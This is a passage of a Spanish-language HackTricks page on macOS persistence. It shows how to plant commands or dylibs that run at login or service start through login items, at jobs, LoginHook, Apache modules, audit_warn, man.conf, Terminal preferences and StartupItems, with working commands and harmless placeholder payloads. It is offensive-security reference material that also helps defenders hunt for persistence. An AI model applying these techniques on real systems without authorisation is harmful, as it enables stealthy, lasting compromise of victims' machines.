__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### **Elementos de inicio de sesión**

Descripción: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

#### Ubicaciones

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Disparador:** Inicio de sesión
* Carga útil de explotación almacenada llamando a **`osascript`**
* TODO: Encontrar una forma de acceder directamente en el disco (si es posible)
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Disparador:** Inicio de sesión
* Se requiere acceso de root

#### Descripción

En Preferencias del Sistema -> Usuarios y Grupos -> **Elementos de inicio de sesión** puedes encontrar **elementos que se ejecutarán cuando el usuario inicie sesión**.\
Es posible listarlos, agregarlos y eliminarlos desde la línea de comandos:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Estos elementos se almacenan en el archivo **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Los **elementos de inicio de sesión** también se pueden indicar utilizando la API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), que almacenará la configuración en **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP como elemento de inicio de sesión

Si almacenas un archivo **ZIP** como un **elemento de inicio de sesión**, el **`Archive Utility`** lo abrirá y si el zip se almacenó, por ejemplo, en **`~/Library`** y contenía la carpeta **`LaunchAgents/file.plist`** con una puerta trasera, esa carpeta se creará (no lo está de forma predeterminada) y se agregará el plist para que la próxima vez que el usuario vuelva a iniciar sesión, se ejecute la **puerta trasera indicada en el plist**.

Otra opción sería crear los archivos **`.bash_profile`** y **`.zshenv`** dentro del directorio HOME del usuario, por lo que si la carpeta LaunchAgents ya existe, esta técnica seguiría funcionando.

### At

Artículo: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

#### Ubicación

* Se necesita **ejecutar** **`at`** y debe estar **habilitado**

#### **Descripción**

Las "tareas at" se utilizan para **programar tareas en momentos específicos**.\
Estas tareas son diferentes de las tareas cron en el sentido de que **son tareas únicas** que se eliminan después de ejecutarse. Sin embargo, **sobreviven a un reinicio del sistema**, por lo que no se pueden descartar como una posible amenaza.

De forma **predeterminada**, están **deshabilitadas**, pero el usuario **root** puede **habilitarlas** con:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Esto creará un archivo en 1 hora:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Verifique la cola de trabajos usando `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Arriba podemos ver dos trabajos programados. Podemos imprimir los detalles del trabajo usando `at -c NUMERODETRABAJO`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Si las tareas de AT no están habilitadas, las tareas creadas no se ejecutarán.
{% endhint %}

Los **archivos de trabajo** se pueden encontrar en `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
El nombre de archivo contiene la cola, el número de trabajo y la hora programada para ejecutarse. Por ejemplo, echemos un vistazo a `a0001a019bdcd2`.

* `a` - esta es la cola
* `0001a` - número de trabajo en hexadecimal, `0x1a = 26`
* `019bdcd2` - hora en hexadecimal. Representa los minutos transcurridos desde la época. `0x019bdcd2` es `26991826` en decimal. Si lo multiplicamos por 60, obtenemos `1619509560`, que es `GMT: 27 de abril de 2021, martes 7:46:00`.

Si imprimimos el archivo de trabajo, encontramos que contiene la misma información que obtuvimos usando `at -c`.

### Ganchos de inicio/salida de sesión

**Descripción**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

#### Ubicación

* Necesitas poder ejecutar algo como `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`

Están obsoletos pero se pueden usar para ejecutar comandos cuando un usuario inicia sesión.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Esta configuración se almacena en `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Para eliminarlo:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
El usuario root se encuentra almacenado en **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

{% hint style="danger" %}
Esto no funcionó para mí, ni con el usuario LoginHook ni con el root LoginHook
{% endhint %}

### Apache2

**Descripción**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

#### Ubicación

* **`/etc/apache2/httpd.conf`**
* Se requiere acceso de root
* Desencadenante: Cuando se inicia Apache2

#### Descripción y Exploit

Puedes indicar en /etc/apache2/httpd.conf que se cargue un módulo agregando una línea como esta:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

De esta manera, tus módulos compilados serán cargados por Apache. Lo único es que necesitas **firmarlo con un certificado válido de Apple**, o necesitas **agregar un nuevo certificado confiable** en el sistema y **firmarlo** con él.

Luego, si es necesario, para asegurarte de que el servidor se inicie, puedes ejecutar:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Ejemplo de código para el Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Complementos de sincronización del Finder

**Descripción**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Descripción**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

#### Ubicación

* Una aplicación específica

#### Descripción y Exploit

Un ejemplo de aplicación con una Extensión de Sincronización del Finder [**se puede encontrar aquí**](https://github.com/D00MFist/InSync).

Las aplicaciones pueden tener `Extensiones de Sincronización del Finder`. Esta extensión se colocará dentro de una aplicación que se ejecutará. Además, para que la extensión pueda ejecutar su código, **debe estar firmada** con un certificado de desarrollador válido de Apple, debe estar **sandboxeada** (aunque se pueden agregar excepciones relajadas) y debe estar registrada con algo como:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Marco de auditoría BSM

Descripción: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

#### Ubicación

* **`/etc/security/audit_warn`**
* Se requiere acceso de root
* **Desencadenante**: Cuando auditd detecta una advertencia

#### Descripción y Exploit

Cada vez que auditd detecta una advertencia, se **ejecuta** el script **`/etc/security/audit_warn`**. Por lo tanto, podrías agregar tu carga útil en él.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Podrías forzar una advertencia con `sudo audit -n`.

### Man.conf

Artículo: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

#### Ubicación

* **`/private/etc/man.conf`**
* Se requiere acceso de root
* **`/private/etc/man.conf`**: Cada vez que se utiliza el comando man

#### Descripción y Exploit

El archivo de configuración **`/private/etc/man.conf`** indica el binario o script a utilizar al abrir archivos de documentación de man. Por lo tanto, se puede modificar la ruta del ejecutable para que cada vez que el usuario utilice el comando man para leer algún documento, se ejecute una puerta trasera.

Por ejemplo, establecer en **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Y luego crea `/tmp/view` de la siguiente manera:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Terminal

En **`~/Library/Preferences`** se almacenan las preferencias del usuario en las aplicaciones. Algunas de estas preferencias pueden contener una configuración para **ejecutar otras aplicaciones/scripts**.

Por ejemplo, Terminal puede ejecutar un comando al iniciar:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Esta configuración se refleja en el archivo **`~/Library/Preferences/com.apple.Terminal.plist`** de la siguiente manera:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Entonces, si se puede sobrescribir el plist de las preferencias del terminal en el sistema, la funcionalidad **`open`** se puede utilizar para **abrir el terminal y ejecutar ese comando**.

Puedes agregar esto desde la línea de comandos con:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Emond

Apple introdujo un mecanismo de registro llamado **emond**. Parece que nunca fue completamente desarrollado y el desarrollo puede haber sido **abandonado** por Apple en favor de otros mecanismos, pero sigue **disponible**.

Este servicio poco conocido puede **no ser de mucha utilidad para un administrador de Mac**, pero para un actor de amenazas, una muy buena razón sería utilizarlo como un mecanismo de persistencia que probablemente la mayoría de los administradores de macOS no sabrían buscar. Detectar el uso malicioso de emond no debería ser difícil, ya que el System LaunchDaemon del servicio busca scripts para ejecutar solo en un lugar:
```bash
ls -l /private/var/db/emondClients
```
{% hint style="danger" %}
**Como esto no se usa mucho, cualquier cosa en esa carpeta debería ser sospechosa**
{% endhint %}

### Elementos de inicio

{% hint style="danger" %}
**Esto está obsoleto, por lo que no se debe encontrar nada en los siguientes directorios.**
{% endhint %}

Un **StartupItem** es un **directorio** que se **coloca** en una de estas dos carpetas: `/Library/StartupItems/` o `/System/Library/StartupItems/`

Después de colocar un nuevo directorio en una de estas dos ubicaciones, se deben colocar **dos elementos más** dentro de ese directorio. Estos dos elementos son un **script rc** y un **plist** que contiene algunas configuraciones. Este plist debe llamarse "**StartupParameters.plist**".

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% tab title="superservicename" %}Nombre del servicio súper
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### /etc/rc.common

{% hint style="danger" %}
**Esto no funciona en las versiones modernas de MacOS**
{% endhint %}

También es posible colocar aquí **comandos que se ejecutarán al inicio.** Ejemplo de un script rc.common regular:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
### Perfiles

Los perfiles de configuración pueden obligar a un usuario a utilizar ciertas configuraciones del navegador, configuraciones de proxy DNS o configuraciones de VPN. Existen muchas otras cargas útiles que los hacen propensos a ser abusados.

Puedes enumerarlos ejecutando:
```bash
ls -Rl /Library/Managed\ Preferences/
```
### Otras técnicas y herramientas de persistencia

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
